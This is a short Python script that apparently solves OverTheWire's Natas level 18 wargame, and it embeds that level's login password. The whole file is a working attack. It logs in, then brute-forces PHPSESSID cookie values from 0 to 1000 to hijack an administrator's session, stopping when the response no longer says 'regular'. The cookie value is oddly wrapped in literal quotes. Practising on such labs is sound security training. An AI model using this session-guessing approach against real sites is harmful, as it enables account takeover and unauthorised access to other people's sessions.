import requests


def main():
        url="http://natas18.natas.labs.overthewire.org"
        auth_user="natas18"
        auth_pass="8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
        s=requests.Session()
        r=s.post(url,auth=(auth_user,auth_pass),data={'username':auth_user,'password':auth_pass,'submit':'login'})
        print(r.cookies.get_dict())
        # let us bruteforce for admins PHPSESSID
        for i in range(1001):
                cookie={'PHPSESSID':f"'{str(i)}'"}
                r=s.post(url,auth=(auth_user,auth_pass),data={'username':auth_user,'password':auth_pass,'submit':'login'},cookies=cookie)
                if 'regular' not in r.text:
                        print(r.text)
                        break
        return

if __name__=="__main__":
        main()